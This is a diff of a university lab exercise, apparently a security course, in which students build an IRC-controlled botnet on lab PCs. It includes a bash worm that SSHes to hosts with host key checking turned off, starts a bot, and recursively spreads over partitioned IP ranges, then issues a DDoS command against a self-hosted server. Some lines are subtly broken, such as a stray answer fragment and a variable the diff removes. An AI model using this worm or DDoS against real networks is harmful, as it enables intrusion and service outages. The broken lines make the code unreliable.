@@ -36,17 +36,22 @@
 # our botmaster and bots will connect to.
 
 # Edit the "ergo-2.13.0-linux-x86_64/ircd.yaml" file.
-# Under "server -> listeners", replace 127.0.0.1 with the address you found.
+# Under "server -> listeners", replace 127.0.0.1 with your lab pc's ip address.
 
-# Navigate to the "ergo-2.13.0-linux-x86_64" directory and run "./ergo run" to start the server.
+# Navigate to the "ergo-2.13.0-linux-x86_64" directory.
+# Run "./ergo mkcerts" then "./ergo run" to start the server.
 
-# QUESTION: What is the standard plaintext port that our bots use to connect to the IRC server?
-# ANSWER: 
+# QUESTION: What is the standard plaintext port (tls=false) that our bots use to connect to the IRC server?
+# ANSWER: What is the nickname that 
 
 
 # [JOINING IRC SERVER AS BOTMASTER]
 
 # In a separate terminal, run "./c2.py <irc_server_ip>" to join the IRC server as the botmaster.
+# Observe the IRC server output and the IRC client output.
+
+# QUESTION: What is the nickname we used to join the IRC server?
+# ANSWER: master-
 
 
 # [RECONNAISSANCE]
@@ -98,21 +103,25 @@ while [ $i -le $range_end ]; do
         # SSH port was open. Infect the host.
 
         # Divide and conquer:
-        # Assign a partition of the ip range to the new bot.
-        right_range_end=$range_end
-        left_range_end=$(( i + ((range_end - i) / 2) ))
-        right_range_start=$(( left_range_end + 1 ))
+        # Partition the ip range for the new bot.
+        new_range_end=$range_end
+        range_end=$(( i + ((range_end - i) / 2) ))
+        new_range_start=$(( left_range_end + 1 ))
 
         # Normally, this is when we attempt to gain unauthorized access to each victim machine,
         # however, since we are already logged in as a user, we can ssh into the other machines
         # for free without having to provide a password. This is also where we introduce our
         # botnet files into each victim machine, however, this is already taken care of by NFS.
 
-        # Infect host and use it to recursively infect more victims.
-        # TODO: Replace <> and <> with the scripts that we want to execute on the victim lab pc.
-        ssh -o "StrictHostKeyChecking no" $ip_address "cd $script_dir; ./bot.py $irc_server & ./botnet.sh $right_range_start $right_range_end &" &
+        # The following command will be executed after ssh-ing into the victim machine.
+        # It must do two things:
+        # - Convert the victim into a bot (call "./bot.py <irc_server_ip>")
+        # - Recursively infect new victims using a partition of the ip range
+        # Make sure to background the processes so that they can both run at the same time.
+        # TODO: Complete the command below.
+        command="cd $script_dir; ./bot.py $irc_server & ./botnet.sh $new_range_start $new_range_end &"
 
-        range_end=$left_range_end
+        ssh -o "StrictHostKeyChecking no" $ip_address $command &
     fi
 
     (( ++i ))
@@ -133,8 +142,13 @@ done
 # In a separate terminal, run the command "python3 -m http.server -b <ip_address> 8080"
 # to start the victim server (run "ifconfig" if you don't remember).
 
-# Send the command "DDOS CONNECTION <target_ip>:<target_port> 8 30 true"
-# using the botmaster IRC client.
+# Instruct your bots to initiate a DDoS attack on the victim server by sending the command
+# "DDOS CONNECTION <target_ip>:<target_port> 8 30 true" via the botmaster IRC client.
 
-# QUESTION: What does this command do?
+# QUESTION: What does this command do? (Reference: https://github.com/MatrixTM/MHDDoS/wiki/Usage-of-script, Layer4 Normal)
 # ANSWER: 
+
+# Congratulations, you have now learned an extremely convoluted way to (Ctrl-C) your own server.
+
+# When you are finished with the lab, please clean up after yourselves and
+# run "./kill_botnet.sh 4 120 <utorid>" :)
